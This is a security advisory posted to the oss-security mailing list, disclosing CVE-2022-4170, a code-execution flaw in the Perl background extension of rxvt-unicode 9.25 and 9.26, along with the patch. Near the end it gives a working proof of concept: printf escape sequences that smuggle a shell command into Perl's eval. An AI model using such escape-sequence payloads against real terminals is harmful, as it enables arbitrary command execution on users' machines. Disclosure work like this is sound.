Received: (qmail 11935 invoked by uid 550); 5 Dec 2022 13:15:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24398 invoked from network); 5 Dec 2022 11:22:56 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=dgl-cx.20210112.gappssmtp.com; s=20210112;
        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=mgdL+kotTSh7eIZxOsF6Xl5eUpHx7gWF1vTNGJgQmCY=;
        b=jfv27DCQfylL26jLZBeibtm/bkj6YvEhp0GSIUGfVJYHGJAq31ji1Y5cK9UjQEVsjY
         51OxF1DF5U3TP8h/afOD2X9/dBcDFn0NrS/+f8/UGjaosVPWlh+N4dgF7/PUq6NTnj27
         K35BlXe8NfZ8mlvpOeBYMPHuwVT1yAsYPY5/nOLqAuspkOb91lJEQggAm3D8T0uCNUBo
         MNzQlSc3Cdobfcgxy8FT14Ufu/Jk1wRcNJb8haMWKhJlormpyTQF2VjJFNIu6KhtCAwJ
         bcLganpWh9FcnZpVfDfOFkI9E/kRorIYdHTXAz3YxhjopwRdvXCfhU/sx68KRPgjoltz
         NPMg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=mgdL+kotTSh7eIZxOsF6Xl5eUpHx7gWF1vTNGJgQmCY=;
        b=S22/JqXIgupr+lsJRKAgvX5sCoC9D8QG3rvXmW8rZcnE8TpUiIcPf5Z2mJG8p3pb7X
         gJnWh4FIx/lXJ8NrFdytjEIQPyRvgGLjWyuv3S1Ulzd4J/8ygGBsQ192S6DOoUv2KAXp
         KYUyTipDXhIjQiCEqrynjd5V/U2XomNr4d/IUiAfZoQtOvGH1oLLSj4ATm+5BAQCizjS
         MmNVFAlc46ROY/t8nop6YL5kOWgTLc/uqI/y+k5zoFqS6s61j7JqpX/7sNqa4RdXxiUr
         lHB2I8lgwumE5ql1xZG34tIFAB7e1n94eZ0yLMQDfobcpOkABlsLxq1Eq5tZJ9Ed79MP
         CAmg==
X-Gm-Message-State: ANoB5pmP41Vi3FNPu84YiL5B1qsdfWNEENRl4OCEATgwqkYVMZdD4dwj
	/u2U2SNNFm1X+AuGSUXVtiZDXePqxdhV9USLCBxCS2fOwuuGBkpFQtU=
X-Google-Smtp-Source: AA0mqf4U6pqBGKiz6/xBhoUQfaFm5DCu8fb+JC79AmCxbn0XJtUP4pgnbyMP6s0ABbzsGmW0BL1vx3Wqx5ji+KpZljc=
X-Received: by 2002:a25:d74f:0:b0:6f6:2b2a:2cbf with SMTP id
 o76-20020a25d74f000000b006f62b2a2cbfmr33604522ybg.61.1670239364338; Mon, 05
 Dec 2022 03:22:44 -0800 (PST)
MIME-Version: 1.0
From: David Leadbeater <dgl@dgl.cx>
Date: Mon, 5 Dec 2022 22:22:33 +1100
Message-ID: <CAP9KPhDh6PJu-0mD12wYUraf1Ya1MSUPwz1PsPO5omi39-OYLw@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Subject: [oss-security] CVE-2022-4170: rxvt-unicode code execution via background OSC

I've discovered rxvt-unicode 9.25 and 9.26 are vulnerable to remote
code execution, in the Perl background extension, when an attacker can
control the data written to the user's terminal and certain options
are set.

The "background" extension is automatically loaded if certain X
resources are set such as 'transparent' (see the full list at the top
of src/perl/background[1]). So it is possible to be using this
extension without realising it.

This is accidentally fixed on version 9.30, and I haven't confirmed
9.29, it appears to not be exploitable, but only due to another (not
security) bug. The actual bug which makes this not vulnerable on 9.30
is simply a wrong number in "on_osc_seq".

For 9.25 and 9.26 the patch at[2] can be backported. The body of the fix is:

 sub q0 {
-   (my $str = shift) =~ s/\x00//g; # make sure there really aren't
any embedded NULs
-   "q\x00$str\x00"
+   "qq\x00\Q$_[0]\E\x00"
 }

Isn't Perl quoting fun? Paranoid people may wish to remove the entire
"on_osc_seq" subroutine to avoid passing any potentially untrusted
input anywhere near eval (this feature is deprecated and the
maintainer did mention they are considering what to do longer term).

It doesn't make sense to withhold an exploit for this; the fix gives a
pretty good idea where to look and this isn't vulnerable in the latest
version.

$ urxvt -transparent

Inside that running terminal:

# Make tint be "\\", which means the ending \x00 is quoted under our control
$ printf '\e]705;\\\a'
# Make the second q0 end the quoted q-string and then be valid perl
under our control
$ printf '\e]20;,rootalign root),`touch /tmp/cve-2022-4170` #\a'

This has been assigned CVE-2022-4170.

David

[1]: http://cvs.schmorp.de/rxvt-unicode/src/perl/background?revision=1.109&view=markup
[2]: http://cvs.schmorp.de/rxvt-unicode/src/perl/background?r1=1.105&r2=1.109
